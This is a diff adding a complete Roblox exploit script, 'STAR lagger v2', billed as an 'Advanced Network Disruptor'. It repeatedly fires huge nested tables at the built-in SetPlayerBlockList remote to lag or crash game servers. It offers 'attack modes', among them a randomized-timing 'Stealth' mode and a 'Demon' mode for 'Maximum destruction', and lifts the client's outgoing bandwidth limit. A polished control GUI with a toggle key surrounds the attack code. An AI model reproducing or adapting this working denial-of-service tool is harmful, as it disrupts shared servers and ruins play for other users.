@@ -1,0 +1,739 @@
+STAR lagger v2
+repeat task.wait() until game:IsLoaded()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local LP = Players.LocalPlayer
+local CONFIG_FILE = "STARLaggerV2.json"
+local State = {
+    enabled = false,
+    keybind = Enum.KeyCode.V,
+    mode = "Normal", -- Normal, Pulse, Burst, Stealth, Demon
+    intensity = 270,
+    savedPos = nil,
+    stats = { packets = 0, startTime = 0 },
+    guiVisible = true,
+}
+local Modes = {
+    Normal = { name = "Normal", desc = "Stable lag", base = 270, wait = 0.22, jitter = 0 },
+    Pulse = { name = "Pulse", desc = "Rhythmic spikes", base = 350, wait = 0.15, pulse = true },
+    Burst = { name = "Burst", desc = "Short intense bursts", base = 400, wait = 0.08, burst = true },
+    Stealth = { name = "Stealth", desc = "Randomized timing", base = 250, wait = 0.3, stealth = true },
+    Demon = { name = "Demon", desc = "Maximum destruction", base = 500, wait = 0.02, demon = true },
+}
+local SaveSys = { dirty = false, pending = nil, lastJson = "" }
+local function buildConfig()
+    return {
+        enabled = State.enabled,
+        keybind = State.keybind.Name,
+        mode = State.mode,
+        intensity = State.intensity,
+        guiPosition = mainFrame and { X = mainFrame.Position.X.Offset, Y = mainFrame.Position.Y.Offset } or State.savedPos,
+    }
+end
+local function saveConfig()
+    SaveSys.dirty = true
+    if SaveSys.pending then task.cancel(SaveSys.pending) end
+    SaveSys.pending = task.delay(0.35, function()
+        SaveSys.pending = nil
+        if not SaveSys.dirty then return end
+        SaveSys.dirty = false
+        local ok, data = pcall(buildConfig)
+        if not ok then return end
+        local ok2, json = pcall(HttpService.JSONEncode, HttpService, data)
+        if not ok2 or json == SaveSys.lastJson then return end
+        SaveSys.lastJson = json
+        pcall(function() writefile(CONFIG_FILE, json) end)
+    end)
+end
+local function loadConfig()
+    local has = false
+    pcall(function() has = isfile(CONFIG_FILE) end)
+    if not has then return end
+    local raw
+    pcall(function() raw = readfile(CONFIG_FILE) end)
+    if not raw then return end
+    local ok, cfg = pcall(function() return HttpService:JSONDecode(raw) end)
+    if not ok or type(cfg) ~= "table" then return end
+    if cfg.keybind and Enum.KeyCode[cfg.keybind] then State.keybind = Enum.KeyCode[cfg.keybind] end
+    if cfg.mode and Modes[cfg.mode] then State.mode = cfg.mode end
+    if cfg.intensity then State.intensity = math.clamp(cfg.intensity, 100, 1000) end
+    if cfg.guiPosition and type(cfg.guiPosition) == "table" then State.savedPos = cfg.guiPosition end
+end
+loadConfig()
+local Lagger = {
+    thread = nil,
+    remote = nil,
+    lastPacket = 0,
+    packetCount = 0,
+    isRunning = false,
+}
+local function findRemote()
+    if Lagger.remote then return Lagger.remote end
+    local rs = game:FindFirstChild("RobloxReplicatedStorage") or game:GetService("RobloxReplicatedStorage")
+    Lagger.remote = rs and rs:FindFirstChild("SetPlayerBlockList")
+    return Lagger.remote
+end
+local function smartBomb(amount, modeData)
+    local remote = findRemote()
+    if not remote then return end
+    -- Adaptive table size based on server response
+    local adaptiveAmount = amount
+    if State.packetCount > 50 then
+        adaptiveAmount = math.floor(amount * 0.8) -- Reduce if too many packets
+    elseif State.packetCount < 10 then
+        adaptiveAmount = math.floor(amount * 1.2) -- Increase if too few
+    end
+    -- Build nested table structure
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    -- Progressive yielding based on intensity
+    local yieldEvery = modeData.demon and 25 or (modeData.burst and 35 or 50)
+    for i = 1, adaptiveAmount do
+        local t = {}
+        table.insert(z, t)
+        z = t
+        if i % yieldEvery == 0 then task.wait() end
+    end
+    -- Calculate max entries with safety cap
+    local maxEntries = math.min(499999 / (adaptiveAmount + 2), modeData.demon and 3000 or 2000)
+    -- Batch insert with yielding
+    local batchSize = modeData.demon and 250 or 500
+    for i = 1, maxEntries do
+        table.insert(main, spam)
+        if i % batchSize == 0 then task.wait() end
+    end
+    -- Fire with error handling
+    local success = pcall(function()
+        if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+            remote:FireServer(main)
+        elseif remote:IsA("RemoteFunction") then
+            remote:InvokeServer(main)
+        end
+    end)
+    if success then
+        State.stats.packets = State.stats.packets + 1
+        Lagger.packetCount = Lagger.packetCount + 1
+    end
+    -- Cleanup memory
+    main = nil
+    spam = nil
+    collectgarbage("step", 1)
+end
+local function getPulseDelay(baseDelay)
+    local phase = (tick() % 2) / 2 -- 0 to 1 over 2 seconds
+    local multiplier = 0.5 + (math.sin(phase * math.pi * 2) * 0.5) -- Oscillate 0.5 to 1.5
+    return baseDelay * multiplier
+end
+local function getBurstDelay(baseDelay, burstState)
+    if burstState.active then
+        burstState.ticks = burstState.ticks - 1
+        if burstState.ticks <= 0 then
+            burstState.active = false
+            burstState.cooldown = math.random(8, 15)
+        end
+        return baseDelay * 0.3 -- Fast during burst
+    else
+        burstState.cooldown = burstState.cooldown - 1
+        if burstState.cooldown <= 0 then
+            burstState.active = true
+            burstState.ticks = math.random(5, 12)
+        end
+        return baseDelay * 2.5 -- Slow during cooldown
+    end
+end
+local function getStealthDelay(baseDelay)
+    -- Random variation آ±40%
+    local variation = 1 + (math.random(-40, 40) / 100)
+    -- Occasional longer pause
+    if math.random(1, 20) == 1 then
+        variation = variation * 3
+    end
+    return baseDelay * variation
+end
+local function startLagger()
+    if Lagger.isRunning then return end
+    Lagger.isRunning = true
+    State.enabled = true
+    State.stats.startTime = tick()
+    State.stats.packets = 0
+    Lagger.packetCount = 0
+    local modeData = Modes[State.mode]
+    local burstState = { active = false, ticks = 0, cooldown = 0 }
+    Lagger.thread = task.spawn(function()
+        while Lagger.isRunning do
+            -- Set network limit
+            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+            -- Calculate dynamic delay based on mode
+            local delay = modeData.wait
+            if modeData.pulse then
+                delay = getPulseDelay(modeData.wait)
+            elseif modeData.burst then
+                delay = getBurstDelay(modeData.wait, burstState)
+            elseif modeData.stealth then
+                delay = getStealthDelay(modeData.wait)
+            elseif modeData.demon then
+                delay = modeData.wait + (math.random(-5, 5) / 1000) -- Micro jitter
+            end
+            -- Fire bomb
+            task.spawn(function()
+                smartBomb(State.intensity, modeData)
+            end)
+            -- Dynamic wait with frame sync
+            task.wait(delay)
+        end
+    end)
+end
+local function stopLagger()
+    Lagger.isRunning = false
+    State.enabled = false
+    if Lagger.thread then
+        task.cancel(Lagger.thread)
+        Lagger.thread = nil
+    end
+    Lagger.packetCount = 0
+end
+local function toggleLagger()
+    if Lagger.isRunning then
+        stopLagger()
+    else
+        startLagger()
+    end
+    return Lagger.isRunning
+end
+local C = {
+    bg = Color3.fromRGB(8, 8, 12),
+    panel = Color3.fromRGB(16, 16, 22),
+    card = Color3.fromRGB(22, 22, 30),
+    cardHover = Color3.fromRGB(30, 30, 42),
+    accent = Color3.fromRGB(100, 150, 255),
+    accentGlow = Color3.fromRGB(120, 180, 255),
+    accent2 = Color3.fromRGB(255, 100, 150),
+    text = Color3.fromRGB(240, 245, 255),
+    textDim = Color3.fromRGB(140, 150, 170),
+    textDark = Color3.fromRGB(90, 100, 120),
+    border = Color3.fromRGB(40, 42, 55),
+    borderLight = Color3.fromRGB(60, 65, 85),
+    statusOn = Color3.fromRGB(100, 255, 150),
+    statusOff = Color3.fromRGB(255, 100, 100),
+    modeNormal = Color3.fromRGB(100, 150, 255),
+    modePulse = Color3.fromRGB(255, 150, 100),
+    modeBurst = Color3.fromRGB(255, 100, 200),
+    modeStealth = Color3.fromRGB(100, 255, 200),
+    modeDemon = Color3.fromRGB(255, 50, 50),
+}
+for _, name in pairs({"STARLagger", "STARLaggerV2"}) do
+    pcall(function()
+        local old = CoreGui:FindFirstChild(name)
+        if old then old:Destroy() end
+    end)
+end
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.Name = "STARLaggerV2"
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.Name = "Main"
+mainFrame.Size = UDim2.new(0, 360, 0, 420)
+mainFrame.Position = UDim2.new(0.5, -180, 0.5, -210)
+mainFrame.BackgroundColor3 = C.bg
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.ClipsDescendants = true
+if State.savedPos then
+    mainFrame.Position = UDim2.new(0, State.savedPos.X, 0, State.savedPos.Y)
+end
+local mainCorner = Instance.new("UICorner", mainFrame)
+mainCorner.CornerRadius = UDim.new(0, 20)
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Thickness = 2
+mainStroke.Color = C.border
+local glow = Instance.new("Frame", mainFrame)
+glow.Size = UDim2.new(1, 20, 1, 20)
+glow.Position = UDim2.new(0, -10, 0, -10)
+glow.BackgroundColor3 = C.accent
+glow.BackgroundTransparency = 0.95
+glow.BorderSizePixel = 0
+glow.ZIndex = 0
+local glowCorner = Instance.new("UICorner", glow)
+glowCorner.CornerRadius = UDim.new(0, 24)
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 90)
+header.BackgroundColor3 = C.panel
+header.BorderSizePixel = 0
+header.ZIndex = 2
+local headerCorner = Instance.new("UICorner", header)
+headerCorner.CornerRadius = UDim.new(0, 20)
+local headerPatch = Instance.new("Frame", header)
+headerPatch.Size = UDim2.new(1, 0, 0, 20)
+headerPatch.Position = UDim2.new(0, 0, 1, -20)
+headerPatch.BackgroundColor3 = C.panel
+headerPatch.BorderSizePixel = 0
+headerPatch.ZIndex = 2
+local logo = Instance.new("Frame", header)
+logo.Size = UDim2.new(0, 56, 0, 56)
+logo.Position = UDim2.new(0, 18, 0.5, -28)
+logo.BackgroundColor3 = C.accent
+logo.BorderSizePixel = 0
+logo.ZIndex = 3
+local logoCorner = Instance.new("UICorner", logo)
+logoCorner.CornerRadius = UDim.new(0, 14)
+local logoStroke = Instance.new("UIStroke", logo)
+logoStroke.Color = C.accentGlow
+logoStroke.Thickness = 2
+local logoText = Instance.new("TextLabel", logo)
+logoText.Size = UDim2.new(1, 0, 1, 0)
+logoText.BackgroundTransparency = 1
+logoText.Text = "STAR"
+logoText.TextColor3 = C.text
+logoText.Font = Enum.Font.GothamBlack
+logoText.TextSize = 22
+logoText.ZIndex = 4
+local titleGroup = Instance.new("Frame", header)
+titleGroup.Size = UDim2.new(0, 200, 0, 60)
+titleGroup.Position = UDim2.new(0, 86, 0.5, -30)
+titleGroup.BackgroundTransparency = 1
+titleGroup.ZIndex = 3
+local titleText = Instance.new("TextLabel", titleGroup)
+titleText.Size = UDim2.new(1, 0, 0, 28)
+titleText.BackgroundTransparency = 1
+titleText.Text = "LAGGER V2"
+titleText.TextColor3 = C.text
+titleText.Font = Enum.Font.GothamBlack
+titleText.TextSize = 18
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+local subtitleText = Instance.new("TextLabel", titleGroup)
+subtitleText.Size = UDim2.new(1, 0, 0, 18)
+subtitleText.Position = UDim2.new(0, 0, 0, 30)
+subtitleText.BackgroundTransparency = 1
+subtitleText.Text = "Advanced Network Disruptor"
+subtitleText.TextColor3 = C.textDim
+subtitleText.Font = Enum.Font.GothamMedium
+subtitleText.TextSize = 10
+subtitleText.TextXAlignment = Enum.TextXAlignment.Left
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 32, 0, 32)
+closeBtn.Position = UDim2.new(1, -42, 0.5, -16)
+closeBtn.BackgroundColor3 = C.card
+closeBtn.Text = "أ—"
+closeBtn.TextColor3 = C.textDim
+closeBtn.Font = Enum.Font.GothamBlack
+closeBtn.TextSize = 18
+closeBtn.AutoButtonColor = false
+closeBtn.BorderSizePixel = 0
+closeBtn.ZIndex = 4
+local closeCorner = Instance.new("UICorner", closeBtn)
+closeCorner.CornerRadius = UDim.new(0, 8)
+local closeStroke = Instance.new("UIStroke", closeBtn)
+closeStroke.Color = C.border
+closeStroke.Thickness = 1.5
+closeBtn.MouseButton1Click:Connect(function()
+    stopLagger()
+    gui:Destroy()
+end)
+closeBtn.MouseEnter:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.accent2}):Play()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {TextColor3 = C.text}):Play()
+end)
+closeBtn.MouseLeave:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.card}):Play()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {TextColor3 = C.textDim}):Play()
+end)
+local content = Instance.new("Frame", mainFrame)
+content.Size = UDim2.new(1, 0, 1, -90)
+content.Position = UDim2.new(0, 0, 0, 90)
+content.BackgroundTransparency = 1
+content.ZIndex = 1
+local contentPad = Instance.new("UIPadding", content)
+contentPad.PaddingLeft = UDim.new(0, 18)
+contentPad.PaddingRight = UDim.new(0, 18)
+contentPad.PaddingTop = UDim.new(0, 16)
+contentPad.PaddingBottom = UDim.new(0, 16)
+local contentLayout = Instance.new("UIListLayout", content)
+contentLayout.Padding = UDim.new(0, 12)
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+local statusCard = Instance.new("Frame", content)
+statusCard.Size = UDim2.new(1, 0, 0, 70)
+statusCard.BackgroundColor3 = C.card
+statusCard.BorderSizePixel = 0
+statusCard.LayoutOrder = 1
+statusCard.ZIndex = 2
+local statusCorner = Instance.new("UICorner", statusCard)
+statusCorner.CornerRadius = UDim.new(0, 12)
+local statusStroke = Instance.new("UIStroke", statusCard)
+statusStroke.Color = C.border
+statusStroke.Thickness = 1.5
+local statusIndicator = Instance.new("Frame", statusCard)
+statusIndicator.Size = UDim2.new(0, 12, 0, 12)
+statusIndicator.Position = UDim2.new(0, 14, 0.5, -6)
+statusIndicator.BackgroundColor3 = C.statusOff
+statusIndicator.BorderSizePixel = 0
+statusIndicator.ZIndex = 3
+local statusIndCorner = Instance.new("UICorner", statusIndicator)
+statusIndCorner.CornerRadius = UDim.new(1, 0)
+local statusLabel = Instance.new("TextLabel", statusCard)
+statusLabel.Name = "StatusLabel"
+statusLabel.Size = UDim2.new(0, 120, 1, 0)
+statusLabel.Position = UDim2.new(0, 34, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "DISABLED"
+statusLabel.TextColor3 = C.statusOff
+statusLabel.Font = Enum.Font.GothamBlack
+statusLabel.TextSize = 16
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.ZIndex = 3
+local statsLabel = Instance.new("TextLabel", statusCard)
+statsLabel.Size = UDim2.new(0, 100, 0, 20)
+statsLabel.Position = UDim2.new(0, 34, 0, 42)
+statsLabel.BackgroundTransparency = 1
+statsLabel.Text = "0 packets"
+statsLabel.TextColor3 = C.textDark
+statsLabel.Font = Enum.Font.Gotham
+statsLabel.TextSize = 10
+statsLabel.TextXAlignment = Enum.TextXAlignment.Left
+statsLabel.ZIndex = 3
+local toggleBtn = Instance.new("TextButton", statusCard)
+toggleBtn.Size = UDim2.new(0, 80, 0, 46)
+toggleBtn.Position = UDim2.new(1, -94, 0.5, -23)
+toggleBtn.BackgroundColor3 = C.accent
+toggleBtn.Text = "START"
+toggleBtn.TextColor3 = C.text
+toggleBtn.Font = Enum.Font.GothamBlack
+toggleBtn.TextSize = 14
+toggleBtn.AutoButtonColor = false
+toggleBtn.BorderSizePixel = 0
+toggleBtn.ZIndex = 3
+local toggleCorner = Instance.new("UICorner", toggleBtn)
+toggleCorner.CornerRadius = UDim.new(0, 10)
+local toggleStroke = Instance.new("UIStroke", toggleBtn)
+toggleStroke.Color = C.accentGlow
+toggleStroke.Thickness = 2
+local function updateStatus()
+    local isOn = Lagger.isRunning
+    statusLabel.Text = isOn and "ENABLED" or "DISABLED"
+    statusLabel.TextColor3 = isOn and C.statusOn or C.statusOff
+    statusIndicator.BackgroundColor3 = isOn and C.statusOn or C.statusOff
+    toggleBtn.Text = isOn and "STOP" or "START"
+    toggleBtn.BackgroundColor3 = isOn and C.accent2 or C.accent
+    TweenService:Create(statusCard, TweenInfo.new(0.3), {
+        BackgroundColor3 = isOn and Color3.fromRGB(25, 35, 30) or C.card
+    }):Play()
+    TweenService:Create(statusStroke, TweenInfo.new(0.3), {
+        Color = isOn and C.statusOn or C.border
+    }):Play()
+end
+local function doToggle()
+    toggleLagger()
+    updateStatus()
+end
+toggleBtn.MouseButton1Click:Connect(doToggle)
+statusCard.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        doToggle()
+    end
+end)
+toggleBtn.MouseEnter:Connect(function()
+    if not Lagger.isRunning then
+        TweenService:Create(toggleBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.accentGlow}):Play()
+    end
+end)
+toggleBtn.MouseLeave:Connect(function()
+    if not Lagger.isRunning then
+        TweenService:Create(toggleBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.accent}):Play()
+    end
+end)
+task.spawn(function()
+    while task.wait(0.5) do
+        if not statsLabel or not statsLabel.Parent then break end
+        if Lagger.isRunning then
+            local elapsed = tick() - State.stats.startTime
+            local rate = elapsed > 0 and math.floor(State.stats.packets / elapsed * 10) / 10 or 0
+            statsLabel.Text = string.format("%d packets â€¢ %.1f/s", State.stats.packets, rate)
+        else
+            statsLabel.Text = "0 packets"
+        end
+    end
+end)
+local modeLabel = Instance.new("TextLabel", content)
+modeLabel.Size = UDim2.new(1, 0, 0, 16)
+modeLabel.BackgroundTransparency = 1
+modeLabel.Text = "ATTACK MODE"
+modeLabel.TextColor3 = C.textDim
+modeLabel.Font = Enum.Font.GothamBold
+modeLabel.TextSize = 10
+modeLabel.LayoutOrder = 2
+modeLabel.ZIndex = 2
+local modeFrame = Instance.new("Frame", content)
+modeFrame.Size = UDim2.new(1, 0, 0, 80)
+modeFrame.BackgroundTransparency = 1
+modeFrame.LayoutOrder = 3
+modeFrame.ZIndex = 2
+local modeGrid = Instance.new("UIGridLayout", modeFrame)
+modeGrid.CellSize = UDim2.new(0.32, -6, 0, 36)
+modeGrid.CellPadding = UDim2.new(0, 8, 0, 8)
+modeGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+local modeButtons = {}
+local function updateModeVisuals()
+    for name, btn in pairs(modeButtons) do
+        local isActive = (State.mode == name)
+        local modeColor = Modes[name].demon and C.modeDemon or 
+                         (Modes[name].burst and C.modeBurst or 
+                         (Modes[name].pulse and C.modePulse or 
+                         (Modes[name].stealth and C.modeStealth or C.modeNormal)))
+        TweenService:Create(btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = isActive and modeColor or C.card,
+            BackgroundTransparency = isActive and 0.2 or 0
+        }):Play()
+        btn.TextColor3 = isActive and C.text or C.textDim
+        btn.Text = isActive and ("â€¢ " .. name:upper()) or name:upper()
+    end
+end
+for modeName, modeData in pairs(Modes) do
+    local btn = Instance.new("TextButton", modeFrame)
+    btn.Size = UDim2.new(0.32, -6, 0, 36)
+    btn.BackgroundColor3 = C.card
+    btn.Text = modeName:upper()
+    btn.TextColor3 = C.textDim
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 10
+    btn.AutoButtonColor = false
+    btn.BorderSizePixel = 0
+    btn.ZIndex = 3
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, 8)
+    local btnStroke = Instance.new("UIStroke", btn)
+    btnStroke.Color = C.border
+    btnStroke.Thickness = 1
+    btn.MouseEnter:Connect(function()
+        if State.mode ~= modeName then
+            TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = C.cardHover}):Play()
+        end
+    end)
+    btn.MouseLeave:Connect(function()
+        if State.mode ~= modeName then
+            TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = C.card}):Play()
+        end
+    end)
+    btn.MouseButton1Click:Connect(function()
+        State.mode = modeName
+        State.intensity = modeData.base
+        updateModeVisuals()
+        saveConfig()
+        -- Restart if running
+        if Lagger.isRunning then
+            stopLagger()
+            task.wait(0.1)
+            startLagger()
+        end
+    end)
+    modeButtons[modeName] = btn
+end
+updateModeVisuals()
+local intensityLabel = Instance.new("TextLabel", content)
+intensityLabel.Size = UDim2.new(1, 0, 0, 16)
+intensityLabel.BackgroundTransparency = 1
+intensityLabel.Text = "INTENSITY"
+intensityLabel.TextColor3 = C.textDim
+intensityLabel.Font = Enum.Font.GothamBold
+intensityLabel.TextSize = 10
+intensityLabel.LayoutOrder = 4
+intensityLabel.ZIndex = 2
+local intensityFrame = Instance.new("Frame", content)
+intensityFrame.Size = UDim2.new(1, 0, 0, 40)
+intensityFrame.BackgroundColor3 = C.card
+intensityFrame.BorderSizePixel = 0
+intensityFrame.LayoutOrder = 5
+intensityFrame.ZIndex = 2
+local intensityCorner = Instance.new("UICorner", intensityFrame)
+intensityCorner.CornerRadius = UDim.new(0, 10)
+local intensityStroke = Instance.new("UIStroke", intensityFrame)
+intensityStroke.Color = C.border
+intensityStroke.Thickness = 1
+local track = Instance.new("Frame", intensityFrame)
+track.Size = UDim2.new(1, -24, 0, 6)
+track.Position = UDim2.new(0, 12, 0.5, -3)
+track.BackgroundColor3 = C.border
+track.BorderSizePixel = 0
+track.ZIndex = 3
+local trackCorner = Instance.new("UICorner", track)
+trackCorner.CornerRadius = UDim.new(0, 3)
+local fill = Instance.new("Frame", track)
+fill.Size = UDim2.new((State.intensity - 100) / 900, 0, 1, 0)
+fill.BackgroundColor3 = C.accent
+fill.BorderSizePixel = 0
+fill.ZIndex = 4
+local fillCorner = Instance.new("UICorner", fill)
+fillCorner.CornerRadius = UDim.new(0, 3)
+local handle = Instance.new("Frame", track)
+handle.Size = UDim2.new(0, 16, 0, 16)
+handle.Position = UDim2.new((State.intensity - 100) / 900, -8, 0.5, -8)
+handle.BackgroundColor3 = C.text
+handle.BorderSizePixel = 0
+handle.ZIndex = 5
+local handleCorner = Instance.new("UICorner", handle)
+handleCorner.CornerRadius = UDim.new(1, 0)
+local intensityValue = Instance.new("TextLabel", intensityFrame)
+intensityValue.Size = UDim2.new(0, 50, 0, 20)
+intensityValue.Position = UDim2.new(1, -60, 0, 2)
+intensityValue.BackgroundTransparency = 1
+intensityValue.Text = tostring(State.intensity)
+intensityValue.TextColor3 = C.accent
+intensityValue.Font = Enum.Font.GothamBold
+intensityValue.TextSize = 11
+intensityValue.ZIndex = 3
+local sliderDragging = false
+local function updateIntensity(px)
+    local trackAbs = track.AbsolutePosition.X
+    local trackW = track.AbsoluteSize.X
+    local relX = math.clamp(px - trackAbs, 0, trackW)
+    local pct = relX / trackW
+    local val = math.floor(100 + (pct * 900))
+    State.intensity = val
+    fill.Size = UDim2.new(pct, 0, 1, 0)
+    handle.Position = UDim2.new(pct, -8, 0.5, -8)
+    intensityValue.Text = tostring(val)
+    -- Update current mode base
+    if Modes[State.mode] then
+        Modes[State.mode].base = val
+    end
+    saveConfig()
+end
+track.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        sliderDragging = true
+        updateIntensity(inp.Position.X)
+    end
+end)
+UIS.InputChanged:Connect(function(inp)
+    if sliderDragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+        updateIntensity(inp.Position.X)
+    end
+end)
+UIS.InputEnded:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        sliderDragging = false
+    end
+end)
+local keybindFrame = Instance.new("Frame", content)
+keybindFrame.Size = UDim2.new(1, 0, 0, 42)
+keybindFrame.BackgroundColor3 = C.card
+keybindFrame.BorderSizePixel = 0
+keybindFrame.LayoutOrder = 6
+keybindFrame.ZIndex = 2
+local keybindCorner = Instance.new("UICorner", keybindFrame)
+keybindCorner.CornerRadius = UDim.new(0, 10)
+local keybindStroke = Instance.new("UIStroke", keybindFrame)
+keybindStroke.Color = C.border
+keybindStroke.Thickness = 1
+local keybindLabel = Instance.new("TextLabel", keybindFrame)
+keybindLabel.Size = UDim2.new(0, 100, 1, 0)
+keybindLabel.Position = UDim2.new(0, 12, 0, 0)
+keybindLabel.BackgroundTransparency = 1
+keybindLabel.Text = "TOGGLE KEY"
+keybindLabel.TextColor3 = C.textDim
+keybindLabel.Font = Enum.Font.GothamBold
+keybindLabel.TextSize = 11
+keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+keybindLabel.ZIndex = 3
+local keybindBtn = Instance.new("TextButton", keybindFrame)
+keybindBtn.Size = UDim2.new(0, 70, 0, 30)
+keybindBtn.Position = UDim2.new(1, -82, 0.5, -15)
+keybindBtn.BackgroundColor3 = C.panel
+keybindBtn.Text = State.keybind.Name
+keybindBtn.TextColor3 = C.accent
+keybindBtn.Font = Enum.Font.GothamBold
+keybindBtn.TextSize = 12
+keybindBtn.AutoButtonColor = false
+keybindBtn.BorderSizePixel = 0
+keybindBtn.ZIndex = 3
+local keybindBtnCorner = Instance.new("UICorner", keybindBtn)
+keybindBtnCorner.CornerRadius = UDim.new(0, 6)
+local keybindBtnStroke = Instance.new("UIStroke", keybindBtn)
+keybindBtnStroke.Color = C.borderLight
+keybindBtnStroke.Thickness = 1.5
+local listening = false
+local listenConn = nil
+local function stopListening(key)
+    listening = false
+    if listenConn then listenConn:Disconnect(); listenConn = nil end
+    keybindBtn.TextColor3 = C.accent
+    if key then
+        State.keybind = key
+        keybindBtn.Text = key.Name
+        saveConfig()
+    end
+end
+keybindBtn.MouseButton1Click:Connect(function()
+    if listening then stopListening(nil); return end
+    listening = true
+    keybindBtn.Text = "..."
+    keybindBtn.TextColor3 = C.accent2
+    listenConn = UIS.InputBegan:Connect(function(inp)
+        if not listening then return end
+        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
+        if inp.KeyCode == Enum.KeyCode.Escape then stopListening(nil); return end
+        stopListening(inp.KeyCode)
+    end)
+end)
+local dragging, dragStart, startPos = false, nil, nil
+header.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = inp.Position
+        startPos = mainFrame.Position
+        inp.Changed:Connect(function()
+            if inp.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                saveConfig()
+            end
+        end)
+    end
+end)
+UIS.InputChanged:Connect(function(inp)
+    if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+        local delta = inp.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UIS.InputBegan:Connect(function(inp, processed)
+    if processed then return end
+    if listening then
+        if inp.KeyCode == Enum.KeyCode.Escape then
+            stopListening(nil)
+        elseif inp.UserInputType == Enum.UserInputType.Keyboard then
+            stopListening(inp.KeyCode)
+        end
+        return
+    end
+    if inp.KeyCode == State.keybind and inp.UserInputType == Enum.UserInputType.Keyboard then
+        doToggle()
+    elseif inp.KeyCode == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        State.guiVisible = mainFrame.Visible
+    end
+end)
+mainFrame.Size = UDim2.new(0, 360, 0, 0)
+mainFrame.Visible = true
+TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 360, 0, 420)
+}):Play()
+task.spawn(function()
+    while task.wait(2) do
+        if not glow or not glow.Parent then break end
+        TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            BackgroundTransparency = 0.92
+        }):Play()
+        task.wait(1)
+        if not glow or not glow.Parent then break end
+        TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            BackgroundTransparency = 0.95
+        }):Play()
+    end
+end)
+print("[STAR Lagger V2] Loaded with advanced engine!")
+print("Modes: Normal | Pulse | Burst | Stealth | Demon")
+print("Keybind: " .. State.keybind.Name)
